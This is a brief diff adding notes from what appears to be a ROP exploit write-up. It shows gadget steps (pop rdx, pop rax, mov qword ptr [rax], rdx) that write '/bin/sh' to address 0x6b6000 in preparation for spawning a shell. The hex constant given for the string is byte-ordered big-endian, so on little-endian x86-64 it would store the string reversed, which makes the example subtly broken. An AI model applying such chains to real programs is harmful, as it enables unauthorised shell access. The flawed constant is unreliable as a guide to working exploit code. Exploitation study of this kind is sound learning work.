@@ -1,0 +1,6 @@
+Here is the assembly equivalent for these blocks
+write "/bin/sh" to 0x6b6000
+
+pop rdx, 0x2f62696e2f736800
+pop rax, 0x6b6000
+mov qword ptr [rax], rdx
